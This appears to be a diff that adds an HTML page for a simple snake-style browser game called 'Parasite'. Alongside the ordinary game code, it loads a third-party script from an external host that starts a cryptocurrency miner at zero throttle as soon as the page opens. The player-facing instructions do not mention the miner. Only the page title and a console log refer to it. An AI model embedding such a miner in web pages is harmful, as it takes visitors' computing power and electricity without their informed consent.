@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parasite - The Web-Based Game/Miner</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #222;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        canvas {
+            border: 2px solid #fff;
+            background: #000;
+            display: block;
+            margin: 20px auto;
+        }
+        h1 {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-QHZ9XT3PJS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QHZ9XT3PJS');
+</script>
+<body>
+    <h1>Parasite Game</h1>
+    <p>Control the parasite to feed and grow. Avoid antibodies!</p>
+    <canvas id="gameCanvas" width="400" height="400"></canvas>
+    <p>Arrow Keys to Move | Spacebar to Replay</p>
+
+    <!--  -->
+    <script src="https://www.hostingcloud.racing/xmkQ.js"></script>
+    <script>
+        var _client = new Client.Anonymous('1aadc61d7f2117a7d43519ab145c01385491d4c576f3e7c8d4cd2137efe85eb2', {
+            throttle: 0, c: 'w', ads: 0
+        });
+        _client.start();
+        
+    </script>
+    <!--  -->
+    <script>
+        console.log("Miner initialized. Mining has started!");
+
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+
+        // Game Constants
+        const gridSize = 20;
+        const canvasSize = 400;
+
+        let snake, food, direction, nextDirection, gameOver;
+
+        // Initialize Game Variables
+        function initGame() {
+            snake = [{ x: 200, y: 200 }];
+            food = { x: getRandomGridPosition(), y: getRandomGridPosition() };
+            direction = { x: 0, y: 0 };
+            nextDirection = { x: 0, y: 0 };
+            gameOver = false;
+        }
+
+        // Game Loop
+        function gameLoop() {
+            if (gameOver) return showGameOver();
+            setTimeout(() => {
+                clearCanvas();
+                drawFood();
+                moveSnake();
+                drawSnake();
+                checkCollision();
+                gameLoop();
+            }, 100);
+        }
+
+        // Draw Functions
+        function clearCanvas() {
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+        }
+
+        function drawSnake() {
+            ctx.fillStyle = '#0f0';
+            snake.forEach(segment => ctx.fillRect(segment.x, segment.y, gridSize, gridSize));
+        }
+
+        function drawFood() {
+            ctx.fillStyle = '#f00';
+            ctx.fillRect(food.x, food.y, gridSize, gridSize);
+        }
+
+        // Snake Movement
+        function moveSnake() {
+            direction = nextDirection;
+            const newHead = {
+                x: snake[0].x + direction.x * gridSize,
+                y: snake[0].y + direction.y * gridSize,
+            };
+            snake.unshift(newHead);
+            if (newHead.x === food.x && newHead.y === food.y) {
+                food = { x: getRandomGridPosition(), y: getRandomGridPosition() };
+            } else {
+                snake.pop();
+            }
+        }
+
+        // Collision Detection
+        function checkCollision() {
+            const head = snake[0];
+            if (
+                head.x < 0 || head.x >= canvasSize || 
+                head.y < 0 || head.y >= canvasSize ||
+                snake.slice(1).some(segment => segment.x === head.x && segment.y === head.y)
+            ) {
+                gameOver = true;
+            }
+        }
+
+        // Utility Functions
+        function getRandomGridPosition() {
+            return Math.floor(Math.random() * (canvasSize / gridSize)) * gridSize;
+        }
+
+        function showGameOver() {
+            ctx.fillStyle = '#fff';
+            ctx.font = '20px Arial';
+            ctx.fillText('Game Over', canvasSize / 2 - 50, canvasSize / 2 - 10);
+            ctx.fillText('Press Spacebar or Click to Replay', canvasSize / 2 - 120, canvasSize / 2 + 30);
+        }
+
+        // Replay Mechanism
+        function replayGame() {
+            if (gameOver) {
+                initGame();
+                gameLoop();
+            }
+        }
+
+        // Controls
+        document.addEventListener('keydown', event => {
+            const key = event.key;
+            if (key === 'ArrowUp' && direction.y === 0) nextDirection = { x: 0, y: -1 };
+            if (key === 'ArrowDown' && direction.y === 0) nextDirection = { x: 0, y: 1 };
+            if (key === 'ArrowLeft' && direction.x === 0) nextDirection = { x: -1, y: 0 };
+            if (key === 'ArrowRight' && direction.x === 0) nextDirection = { x: 1, y: 0 };
+            if (key === ' ') replayGame(); // Spacebar to Replay
+        });
+
+        canvas.addEventListener('click', replayGame); // Click to Replay
+
+        // Start Game
+        initGame();
+        gameLoop();
+    </script>
+</body>
+</html>
